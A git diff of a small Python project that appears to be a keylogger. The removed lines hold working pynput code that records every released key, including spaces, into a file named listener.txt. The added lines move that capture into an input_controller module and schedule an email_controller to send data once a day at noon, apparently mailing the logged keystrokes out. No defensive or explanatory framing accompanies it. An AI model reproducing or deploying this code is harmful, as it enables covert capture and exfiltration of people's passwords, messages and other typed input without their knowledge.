@@ -1,26 +1,12 @@
-from pynput import keyboard
+import schedule
+import time
+import email_controller
+import input_controller
 
-def write_file(text, file='listener.txt'):
-  with open(file, 'a') as f:
-      f.write(str(text))
+input_controller.listen()
 
-def on_press(key):
-  try:
-    write_file(key.char)
-  except AttributeError:
-    if (key == keyboard.Key.space):
-      write_file(' ')
+schedule.every(1).day.at('12:00').do(email_controller.send)
 
-def on_release(key):
-  try:
-    write_file(key.char)
-  except AttributeError:
-    if (key == keyboard.Key.space):
-      write_file(' ')
-
-
-with keyboard.Listener(
-      # on_press=on_press,
-      on_release=on_release
-    ) as event:
-  event.join()
+while True:
+  schedule.run_pending()
+  time.sleep(1)
